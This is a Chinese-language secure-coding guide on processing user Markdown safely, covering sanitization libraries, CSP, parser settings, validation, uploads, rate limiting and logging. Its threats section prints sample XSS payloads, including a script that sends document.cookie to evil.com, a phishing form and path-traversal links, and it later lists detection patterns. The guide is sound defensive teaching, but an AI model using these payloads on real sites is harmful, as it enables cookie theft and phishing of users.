---
title: Markdown 安全最佳实践
description: 学习如何安全地处理 Markdown 内容，防止 XSS、注入攻击和其他安全威胁。
keywords: markdown安全, xss防护, markdown清理, 安全最佳实践
---

# Markdown 安全最佳实践

虽然 Markdown 看起来是纯文本，但不当的处理可能导致严重的安全漏洞。本指南将教你如何安全地处理 Markdown 内容。

## 常见安全威胁

### 1. XSS (跨站脚本攻击)

Markdown 允许嵌入 HTML，这可能被利用来注入恶意脚本：

```markdown
<!-- 危险：未清理的 HTML -->
<script>
  // 窃取 cookies
  fetch('https://evil.com/steal?data=' + document.cookie);
</script>

<img src="x" onerror="alert('XSS')">

<a href="javascript:alert('XSS')">点击我</a>
```

### 2. HTML 注入

即使没有 JavaScript，恶意 HTML 也可能造成伤害：

```markdown
<!-- 钓鱼攻击 -->
<form action="https://evil.com/phish" method="POST">
  <input type="password" name="password" placeholder="输入密码">
  <button>登录</button>
</form>

<!-- 视觉欺骗 -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
  假冒的登录页面
</div>
```

### 3. Markdown 注入

攻击者可能滥用 Markdown 语法：

```markdown
<!-- 图片洪水攻击 -->
![](http://evil.com/track?user=victim)
![](http://evil.com/track?user=victim)
<!-- ... 重复数千次 -->

<!-- 消耗资源 -->
[链接](javascript:while(1){})
```

### 4. 路径遍历

不安全的文件引用可能导致信息泄露：

```markdown
<!-- 尝试访问敏感文件 -->
![](../../../../../../etc/passwd)
[配置](../../../config/database.yml)
```

## 防护策略

### 1. 内容安全策略 (CSP)

实施严格的 CSP 头：

```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'unsafe-inline' https://trusted-cdn.com; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               font-src 'self' https://fonts.gstatic.com;">
```

**Node.js / Express 实现**

```javascript
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "https://trusted-cdn.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));
```

### 2. HTML 清理

使用专门的清理库：

**DOMPurify（浏览器端）**

```javascript
import DOMPurify from 'dompurify';
import marked from 'marked';

// 解析并清理
const dirty = marked.parse(userMarkdown);
const clean = DOMPurify.sanitize(dirty, {
  ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'ul', 'ol', 'li', 'code', 'pre'],
  ALLOWED_ATTR: ['href', 'title', 'class'],
  ALLOW_DATA_ATTR: false,
  FORBID_TAGS: ['script', 'style', 'iframe', 'form'],
  FORBID_ATTR: ['onerror', 'onclick', 'onload']
});

document.getElementById('output').innerHTML = clean;
```

**Sanitize-HTML（Node.js）**

```javascript
const sanitizeHtml = require('sanitize-html');
const marked = require('marked');

const dirty = marked.parse(userMarkdown);
const clean = sanitizeHtml(dirty, {
  allowedTags: sanitizeHtml.defaults.allowedTags.concat(['img', 'h1', 'h2']),
  allowedAttributes: {
    'a': ['href', 'title', 'target'],
    'img': ['src', 'alt', 'title'],
  },
  allowedSchemes: ['http', 'https', 'mailto'],
  // 移除不允许的标签内容
  disallowedTagsMode: 'discard',
  // 自定义转换器
  transformTags: {
    'a': (tagName, attribs) => {
      return {
        tagName: 'a',
        attribs: {
          ...attribs,
          rel: 'noopener noreferrer',
          target: '_blank'
        }
      };
    }
  }
});
```

### 3. 配置安全的 Markdown 解析器

**Marked 安全配置**

```javascript
const marked = require('marked');

// 禁用 HTML
marked.setOptions({
  sanitize: false,  // 已弃用，使用 DOMPurify
  gfm: true,
  breaks: false,
  pedantic: false,
  smartLists: true,
  smartypants: false
});

// 自定义渲染器过滤危险内容
const renderer = {
  html(html) {
    // 完全阻止 HTML
    return '';
  },
  link(href, title, text) {
    // 只允许安全的协议
    const safeProtocols = ['http:', 'https:', 'mailto:'];
    try {
      const url = new URL(href);
      if (!safeProtocols.includes(url.protocol)) {
        return text;
      }
    } catch {
      return text;
    }
    
    return `<a href="${href}" title="${title || ''}" rel="noopener noreferrer" target="_blank">${text}</a>`;
  },
  image(href, title, text) {
    // 验证图片 URL
    if (!href.match(/^https?:\/\//)) {
      return text;
    }
    return `<img src="${href}" alt="${text}" title="${title || ''}" loading="lazy">`;
  }
};

marked.use({ renderer });
```

**Markdown-it 安全配置**

```javascript
const MarkdownIt = require('markdown-it');

const md = new MarkdownIt({
  html: false,  // 禁用 HTML 标签
  xhtmlOut: true,
  breaks: false,
  linkify: true,
  typographer: true
});

// 验证链接
md.validateLink = function(url) {
  const safeProtocols = /^(https?|mailto):/;
  return safeProtocols.test(url);
};

// 规范化链接
md.normalizeLink = function(url) {
  try {
    const parsed = new URL(url);
    // 移除危险的参数
    parsed.searchParams.delete('javascript');
    return parsed.toString();
  } catch {
    return '';
  }
};
```

**Remark 安全配置**

```javascript
const remark = require('remark');
const html = require('remark-html');
const sanitize = require('rehype-sanitize');

remark()
  .use(html, { sanitize: true })
  .use(sanitize, {
    tagNames: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre'],
    attributes: {
      'a': ['href', 'title'],
      '*': ['className']
    },
    protocols: {
      href: ['http', 'https', 'mailto']
    }
  })
  .process(markdown);
```

## 输入验证

### 1. 内容长度限制

```javascript
function validateMarkdown(markdown) {
  const MAX_LENGTH = 100000;  // 100KB
  const MAX_LINES = 10000;
  const MAX_IMAGE_COUNT = 50;
  
  // 检查长度
  if (markdown.length > MAX_LENGTH) {
    throw new Error('内容过长');
  }
  
  // 检查行数
  const lines = markdown.split('\n');
  if (lines.length > MAX_LINES) {
    throw new Error('行数过多');
  }
  
  // 检查图片数量
  const imageCount = (markdown.match(/!\[.*?\]\(.*?\)/g) || []).length;
  if (imageCount > MAX_IMAGE_COUNT) {
    throw new Error('图片过多');
  }
  
  return true;
}
```

### 2. 模式检测

```javascript
function detectMaliciousPatterns(markdown) {
  const dangerousPatterns = [
    // JavaScript 协议
    /javascript:/gi,
    // Data URL with script
    /data:text\/html.*<script/gi,
    // 事件处理器
    /on\w+\s*=/gi,
    // Base64 编码的脚本
    /data:text\/html;base64/gi,
    // 可疑的 iframe
    /<iframe/gi
  ];
  
  for (const pattern of dangerousPatterns) {
    if (pattern.test(markdown)) {
      return {
        safe: false,
        reason: `检测到可疑模式: ${pattern}`
      };
    }
  }
  
  return { safe: true };
}
```

### 3. URL 白名单

```javascript
class URLValidator {
  constructor(whitelist) {
    this.whitelist = whitelist;
  }
  
  isAllowed(url) {
    try {
      const parsed = new URL(url);
      
      // 只允许 HTTP(S)
      if (!['http:', 'https:'].includes(parsed.protocol)) {
        return false;
      }
      
      // 检查域名白名单
      if (this.whitelist && this.whitelist.length > 0) {
        const allowed = this.whitelist.some(domain => 
          parsed.hostname === domain || 
          parsed.hostname.endsWith('.' + domain)
        );
        if (!allowed) {
          return false;
        }
      }
      
      return true;
    } catch {
      return false;
    }
  }
}

const validator = new URLValidator([
  'example.com',
  'cdn.example.com',
  'images.example.com'
]);

// 在渲染器中使用
const renderer = {
  link(href, title, text) {
    if (!validator.isAllowed(href)) {
      return text;  // 或返回安全的替代链接
    }
    return `<a href="${href}">${text}</a>`;
  }
};
```

## 文件上传安全

### 1. 验证文件类型

```javascript
function validateMarkdownFile(file) {
  const allowedExtensions = ['.md', '.markdown', '.txt'];
  const allowedMimeTypes = ['text/markdown', 'text/plain'];
  
  // 检查扩展名
  const ext = path.extname(file.name).toLowerCase();
  if (!allowedExtensions.includes(ext)) {
    throw new Error('不允许的文件类型');
  }
  
  // 检查 MIME 类型
  if (!allowedMimeTypes.includes(file.type)) {
    throw new Error('不允许的 MIME 类型');
  }
  
  // 检查文件大小
  const MAX_SIZE = 5 * 1024 * 1024;  // 5MB
  if (file.size > MAX_SIZE) {
    throw new Error('文件过大');
  }
  
  return true;
}
```

### 2. 文件名清理

```javascript
function sanitizeFilename(filename) {
  // 移除路径遍历字符
  const safe = filename
    .replace(/[\/\\]/g, '')
    .replace(/\.\./g, '')
    .replace(/[^a-zA-Z0-9._-]/g, '_');
  
  // 限制长度
  return safe.substring(0, 255);
}
```

### 3. 隔离存储

```javascript
const path = require('path');
const crypto = require('crypto');

function getSecureUploadPath(filename) {
  // 生成唯一目录
  const hash = crypto.randomBytes(16).toString('hex');
  const safeFilename = sanitizeFilename(filename);
  
  // 隔离在专门的上传目录
  const uploadDir = path.join(
    process.env.UPLOAD_DIR,
    hash.substring(0, 2),
    hash.substring(2, 4),
    hash
  );
  
  return path.join(uploadDir, safeFilename);
}
```

## 身份验证和授权

### 1. 内容所有权验证

```javascript
async function canEditMarkdown(userId, documentId) {
  const document = await db.documents.findById(documentId);
  
  if (!document) {
    throw new Error('文档不存在');
  }
  
  // 检查所有权
  if (document.ownerId !== userId) {
    // 检查协作权限
    const hasPermission = await db.permissions.check({
      userId,
      documentId,
      permission: 'edit'
    });
    
    if (!hasPermission) {
      throw new Error('无权限编辑此文档');
    }
  }
  
  return true;
}
```

### 2. 速率限制

```javascript
const rateLimit = require('express-rate-limit');

// API 速率限制
const markdownApiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 分钟
  max: 100,  // 限制 100 次请求
  message: '请求过于频繁，请稍后再试',
  standardHeaders: true,
  legacyHeaders: false,
});

app.use('/api/markdown', markdownApiLimiter);

// 上传速率限制（更严格）
const uploadLimiter = rateLimit({
  windowMs: 60 * 60 * 1000,  // 1 小时
  max: 10,  // 限制 10 次上传
  message: '上传次数过多，请稍后再试'
});

app.post('/api/upload', uploadLimiter, uploadHandler);
```

### 3. CSRF 保护

```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

// 在表单中使用
app.get('/markdown/new', csrfProtection, (req, res) => {
  res.render('markdown-editor', { 
    csrfToken: req.csrfToken() 
  });
});

app.post('/markdown/save', csrfProtection, async (req, res) => {
  // 处理保存
});
```

## 实时协作安全

### 1. WebSocket 安全

```javascript
const WebSocket = require('ws');

const wss = new WebSocket.Server({ 
  server,
  verifyClient: (info, callback) => {
    // 验证 token
    const token = info.req.headers['sec-websocket-protocol'];
    
    jwt.verify(token, SECRET_KEY, (err, decoded) => {
      if (err) {
        callback(false, 401, 'Unauthorized');
      } else {
        info.req.user = decoded;
        callback(true);
      }
    });
  }
});

wss.on('connection', (ws, req) => {
  const user = req.user;
  
  ws.on('message', async (message) => {
    try {
      const data = JSON.parse(message);
      
      // 验证权限
      if (!await canEditDocument(user.id, data.documentId)) {
        ws.send(JSON.stringify({ error: '无权限' }));
        return;
      }
      
      // 清理内容
      const cleaned = sanitizeMarkdown(data.content);
      
      // 广播到其他客户端
      broadcast(data.documentId, cleaned, user.id);
    } catch (error) {
      ws.send(JSON.stringify({ error: '处理失败' }));
    }
  });
});
```

### 2. 操作变换 (Operational Transform) 验证

```javascript
function validateOperation(operation, currentContent) {
  // 验证操作类型
  const validTypes = ['insert', 'delete', 'retain'];
  if (!validTypes.includes(operation.type)) {
    throw new Error('无效的操作类型');
  }
  
  // 验证位置
  if (operation.position < 0 || operation.position > currentContent.length) {
    throw new Error('无效的操作位置');
  }
  
  // 验证内容
  if (operation.type === 'insert') {
    const cleaned = sanitizeMarkdown(operation.content);
    operation.content = cleaned;
  }
  
  return operation;
}
```

## 审计和日志

### 1. 记录安全事件

```javascript
const winston = require('winston');

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ 
      filename: 'security.log',
      level: 'warn'
    })
  ]
});

function logSecurityEvent(event) {
  securityLogger.warn({
    timestamp: new Date().toISOString(),
    event: event.type,
    userId: event.userId,
    ip: event.ip,
    details: event.details
  });
}

// 使用
if (detectMaliciousPatterns(markdown)) {
  logSecurityEvent({
    type: 'malicious_content_detected',
    userId: req.user.id,
    ip: req.ip,
    details: { markdown: markdown.substring(0, 100) }
  });
}
```

### 2. 版本控制和审计追踪

```javascript
async function saveMarkdown(documentId, content, userId) {
  // 保存新版本
  const version = await db.versions.create({
    documentId,
    content: sanitizeMarkdown(content),
    userId,
    createdAt: new Date(),
    hash: crypto.createHash('sha256').update(content).digest('hex')
  });
  
  // 记录审计日志
  await db.auditLog.create({
    action: 'update_document',
    documentId,
    userId,
    versionId: version.id,
    timestamp: new Date(),
    metadata: {
      contentLength: content.length,
      ip: req.ip,
      userAgent: req.get('user-agent')
    }
  });
  
  return version;
}
```

## 安全检查清单

### 部署前检查

- [ ] 启用内容安全策略 (CSP)
- [ ] 实施 HTML 清理（DOMPurify/sanitize-html）
- [ ] 禁用或限制原始 HTML
- [ ] 验证所有 URL 和链接
- [ ] 实施速率限制
- [ ] 添加 CSRF 保护
- [ ] 验证文件上传
- [ ] 实施身份验证和授权
- [ ] 设置内容长度限制
- [ ] 启用 HTTPS
- [ ] 配置安全的 HTTP 头
- [ ] 实施日志和监控
- [ ] 定期安全审计
- [ ] 保持依赖更新

### 安全配置示例

```javascript
// 完整的安全配置示例
const express = require('express');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const csrf = require('csurf');
const DOMPurify = require('isomorphic-dompurify');
const marked = require('marked');

const app = express();

// 1. 安全头
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// 2. 速率限制
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100
});
app.use(limiter);

// 3. CSRF 保护
app.use(csrf({ cookie: true }));

// 4. 安全的 Markdown 渲染
function renderMarkdown(markdown) {
  // 验证输入
  if (markdown.length > 100000) {
    throw new Error('内容过长');
  }
  
  // 检测恶意模式
  const check = detectMaliciousPatterns(markdown);
  if (!check.safe) {
    throw new Error(check.reason);
  }
  
  // 解析
  const html = marked.parse(markdown, {
    sanitize: false,  // 将使用 DOMPurify
    gfm: true
  });
  
  // 清理
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_TAGS: ['script', 'style', 'iframe']
  });
  
  return clean;
}

// 5. API 路由
app.post('/api/render', async (req, res) => {
  try {
    const markdown = req.body.markdown;
    const html = renderMarkdown(markdown);
    res.json({ html });
  } catch (error) {
    logSecurityEvent({
      type: 'render_error',
      userId: req.user?.id,
      ip: req.ip,
      error: error.message
    });
    res.status(400).json({ error: error.message });
  }
});

app.listen(3000);
```

## 工具推荐

### 安全扫描
- **npm audit**：依赖安全检查
- **Snyk**：漏洞扫描
- **OWASP ZAP**：Web 应用安全测试

### 清理库
- **DOMPurify**：前端 HTML 清理
- **sanitize-html**：Node.js HTML 清理
- **xss**：轻量级 XSS 过滤

### 监控工具
- **Sentry**：错误和安全事件追踪
- **LogRocket**：用户会话重放
- **Datadog**：安全监控

## 结论

Markdown 安全不容忽视。通过实施适当的清理、验证、身份验证和监控措施，你可以安全地处理用户生成的 Markdown 内容，同时保护应用和用户免受攻击。

## 其他资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
- [DOMPurify 文档](https://github.com/cure53/DOMPurify)
- [Content Security Policy (CSP)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
